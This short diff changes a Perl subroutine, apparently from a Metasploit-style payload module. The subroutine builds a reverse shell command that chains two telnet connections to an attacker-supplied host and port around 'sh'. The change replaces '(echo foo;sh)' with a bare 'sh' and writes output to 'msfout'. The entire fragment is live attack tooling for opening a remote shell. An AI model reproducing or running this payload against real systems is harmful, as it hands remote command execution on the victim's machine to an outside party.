@@ -44,7 +44,7 @@ sub CommandString {
   my $command =
   "sleep 31337|".
   "telnet $host $port|".
-  "(echo foo;sh)|".
+  "sh|".
   "telnet $host $port|".
   "cat>msfout";
   
